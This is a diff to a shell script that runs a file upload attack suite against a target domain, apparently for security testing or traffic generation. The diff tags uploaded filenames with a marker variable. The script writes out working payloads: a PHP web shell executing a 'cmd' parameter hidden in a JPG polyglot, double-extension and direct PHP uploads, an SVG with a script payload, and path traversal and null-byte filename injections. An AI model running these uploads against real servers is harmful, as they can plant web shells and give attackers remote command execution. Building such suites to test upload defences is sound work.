@@ -7,6 +7,7 @@ set -uo pipefail
 
 TARGET="${1:?Usage: 10-file-upload.sh <TARGET_FQDN>}"
 BASE="${TARGET_PROTOCOL:-http}://${TARGET}"
+MARKER="${TGEN_FAMILY_MARKER:?Run through the declared native family journal adapter}"
 
 echo "[*] File upload attack suite against ${TARGET}"
 echo ""
@@ -35,7 +36,7 @@ echo "[+] Upload 1: PHP webshell in .jpg polyglot"
 POLYGLOT="${TMPDIR}/evil.jpg"
 printf '\xFF\xD8\xFF\xE0' >"${POLYGLOT}"
 echo '<?php passthru($_GET["cmd"]); ?>' >>"${POLYGLOT}"
-upload_file "${POLYGLOT}" "avatar.jpg" "PHP-in-JPG polyglot"
+upload_file "${POLYGLOT}" "${MARKER}-avatar.jpg" "PHP-in-JPG polyglot"
 
 echo ""
 
@@ -43,7 +44,7 @@ echo ""
 echo "[+] Upload 2: Double extension (.php.jpg)"
 DOUBLE_EXT="${TMPDIR}/shell.php.jpg"
 echo '<?php echo "pwned"; ?>' >"${DOUBLE_EXT}"
-upload_file "${DOUBLE_EXT}" "shell.php.jpg" "double extension .php.jpg"
+upload_file "${DOUBLE_EXT}" "${MARKER}-double.php.jpg" "double extension .php.jpg"
 
 echo ""
 
@@ -51,15 +52,15 @@ echo ""
 echo "[+] Upload 3: Straight .php upload"
 PHP_FILE="${TMPDIR}/webshell.php"
 echo '<?php echo "test"; ?>' >"${PHP_FILE}"
-upload_file "${PHP_FILE}" "webshell.php" "direct .php upload"
+upload_file "${PHP_FILE}" "${MARKER}-webshell.php" "direct .php upload"
 
 echo ""
 
-# --- 4. Oversized file (1 MB random data) ---
+# --- 4. Oversized file (1 MB deterministic data) ---
 echo "[+] Upload 4: Oversized file (1 MB)"
 BIG_FILE="${TMPDIR}/bigfile.bin"
-dd if=/dev/urandom of="${BIG_FILE}" bs=1024 count=1024 2>/dev/null
-upload_file "${BIG_FILE}" "bigfile.bin" "1 MB random data"
+python3 -c 'import sys; open(sys.argv[1], "wb").write(b"A" * (1024 * 1024))' "${BIG_FILE}"
+upload_file "${BIG_FILE}" "${MARKER}-bigfile.bin" "1 MB deterministic data"
 
 echo ""
 
@@ -72,7 +73,7 @@ cat >"${SVG_FILE}" <<'SVGEOF'
   <text x="0" y="20">SVG XSS</text>
 </svg>
 SVGEOF
-upload_file "${SVG_FILE}" "image.svg" "SVG with JS payload"
+upload_file "${SVG_FILE}" "${MARKER}-image.svg" "SVG with JS payload"
 
 echo ""
 
@@ -80,7 +81,7 @@ echo ""
 echo "[+] Upload 6: HTML with inline script"
 HTML_FILE="${TMPDIR}/evil.html"
 echo '<html><body><h1>Test</h1></body></html>' >"${HTML_FILE}"
-upload_file "${HTML_FILE}" "page.html" "HTML file"
+upload_file "${HTML_FILE}" "${MARKER}-page.html" "HTML file"
 
 echo ""
 
@@ -88,7 +89,7 @@ echo ""
 echo "[+] Upload 7: Path traversal in filename"
 TRAV_FILE="${TMPDIR}/trav.php"
 echo '<?php phpinfo(); ?>' >"${TRAV_FILE}"
-upload_file "${TRAV_FILE}" "../../shell.php" "path traversal ../../shell.php"
+upload_file "${TRAV_FILE}" "../../${MARKER}-traversal.php" "path traversal ../../shell.php"
 
 echo ""
 
@@ -96,7 +97,7 @@ echo ""
 echo "[+] Upload 8: Null byte injection in filename"
 NULL_FILE="${TMPDIR}/null.php"
 echo '<?php phpinfo(); ?>' >"${NULL_FILE}"
-upload_file "${NULL_FILE}" "shell.php%00.jpg" "null byte shell.php%00.jpg"
+upload_file "${NULL_FILE}" "${MARKER}-webnull.php%00.jpg" "null byte shell.php%00.jpg"
 
 echo ""
 echo "[*] File upload attack suite complete (8 upload attempts)"
